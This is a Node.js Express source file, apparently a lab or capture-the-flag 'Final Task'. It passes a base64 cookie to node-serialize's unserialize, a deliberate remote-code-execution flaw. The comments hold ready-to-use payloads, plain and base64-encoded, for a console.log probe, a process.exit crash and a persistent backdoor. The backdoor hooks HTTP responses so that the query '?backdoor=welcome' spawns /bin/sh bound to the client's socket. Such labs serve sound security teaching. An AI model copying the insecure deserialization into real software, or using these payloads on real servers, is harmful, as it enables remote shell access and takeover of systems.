var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var path = require('path');
var serialize = require('node-serialize');

var app = express();

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(express.static(path.join(__dirname, 'public')));

app.use(cookieParser())

app.get('/', function (req, res) {
    if (req.cookies.profile) {
        var str = new Buffer(req.cookies.profile, 'base64').toString();
        console.log(str)
        var obj = serialize.unserialize(str);
        if (obj.username) {
            res.render('main', {title: 'Final Task', username: escape(obj.username)})
        }
    } else {
        // Cookie string : {"username":"new user","IMPORTANT":"CHANGE THE USERNAME", "exec":"_$$ND_FUNC$$_console.log('Wonder what this does')"}
        res.cookie('profile', "eyJ1c2VybmFtZSI6Im5ldyB1c2VyIiwiSU1QT1JUQU5UISEhIjoiQ0hBTkdFIFRIRSBVU0VSTkFNRSBWQVJJQUJMRSEhISEiLCAiZXhlYyI6Il8kJE5EX0ZVTkMkJF9jb25zb2xlLmxvZygnV29uZGVyIHdoYXQgdGhpcyBkb2VzJykifQ==", {
            maxAge: 900000,
            httpOnly: true
        });
        res.render('main', {title: 'Final Task'});
    }
    
});
app.listen(3333);


//////////////////////// CONSOLE.LOG() BASE64 ////////////////////////////
// eyJ1c2VybmFtZSI6Im5ldyB1c2VyIiwiSU1QT1JUQU5UIjoiQ0hBTkdFIFRIRSBVU0VSTkFNRSIsICJleGVjIjoiXyQkTkRfRlVOQyQkX2NvbnNvbGUubG9nKCdXb25kZXIgd2hhdCB0aGlzIGRvZXMnKSJ9

//////////////////////// PROCESS.EXIT() BASE64 ////////////////////////////
// eyJ1c2VybmFtZSI6Im5ldyB1c2VyIiwiSU1QT1JUQU5UIjoiQ0hBTkdFIFRIRSBVU0VSTkFNRSIsICJleGVjIjoiXyQkTkRfRlVOQyQkX3Byb2Nlc3MuZXhpdCgwKSJ9

/////////////////////// BACKDOOR CODE ///////////////////////////////
// {"username":"hackerman","exec":"_$$ND_FUNC$$_require('http').ServerResponse.prototype.end = (function (end) {\r\n return function () {\r\n if (this.socket._httpMessage.req.query.backdoor === 'welcome') {\r\n ['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket))\r\n var cp = require('child_process')\r\n var net = require('net')\r\n var sh = cp.spawn('/bin/sh')\r\n sh.stdout.pipe(this.socket)\r\n sh.stderr.pipe(this.socket)\r\n this.socket.pipe(sh.stdin)\r\n } else {\r\n end.apply(this, arguments)\r\n }\r\n }\r\n})(require('http').ServerResponse.prototype.end)"}

///////////////////// BACKDOOR BASE64 ////////////////////////
// eyJ1c2VybmFtZSI6ImhhY2tlcm1hbiIsImV4ZWMiOiJfJCRORF9GVU5DJCRfcmVxdWlyZSgnaHR0cCcpLlNlcnZlclJlc3BvbnNlLnByb3RvdHlwZS5lbmQgPSAoZnVuY3Rpb24gKGVuZCkge1xyXG4gcmV0dXJuIGZ1bmN0aW9uICgpIHtcclxuIGlmICh0aGlzLnNvY2tldC5faHR0cE1lc3NhZ2UucmVxLnF1ZXJ5LmJhY2tkb29yID09PSAnd2VsY29tZScpIHtcclxuIFsnY2xvc2UnLCAnY29ubmVjdCcsICdkYXRhJywgJ2RyYWluJywgJ2VuZCcsICdlcnJvcicsICdsb29rdXAnLCAndGltZW91dCcsICcnXS5mb3JFYWNoKHRoaXMuc29ja2V0LnJlbW92ZUFsbExpc3RlbmVycy5iaW5kKHRoaXMuc29ja2V0KSlcclxuIHZhciBjcCA9IHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKVxyXG4gdmFyIG5ldCA9IHJlcXVpcmUoJ25ldCcpXHJcbiB2YXIgc2ggPSBjcC5zcGF3bignL2Jpbi9zaCcpXHJcbiBzaC5zdGRvdXQucGlwZSh0aGlzLnNvY2tldClcclxuIHNoLnN0ZGVyci5waXBlKHRoaXMuc29ja2V0KVxyXG4gdGhpcy5zb2NrZXQucGlwZShzaC5zdGRpbilcclxuIH0gZWxzZSB7XHJcbiBlbmQuYXBwbHkodGhpcywgYXJndW1lbnRzKVxyXG4gfVxyXG4gfVxyXG59KShyZXF1aXJlKCdodHRwJykuU2VydmVyUmVzcG9uc2UucHJvdG90eXBlLmVuZCkifQ==

/*
{"username":"hackerman","exec":"_$$ND_FUNC$$_
require('http').ServerResponse.prototype.end = (function (end) {
    return function () {
        if (this.socket._httpMessage.req.query.backdoor === 'welcome') {
            ['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket))
            var cp = require('child_process')
            var net = require('net')
            var sh = cp.spawn('/bin/sh')
            sh.stdout.pipe(this.socket)
            sh.stderr.pipe(this.socket)
            this.socket.pipe(sh.stdin)
        } else {
            end.apply(this, arguments)
        } 
    }
})(require('http').ServerResponse.prototype.end)"} */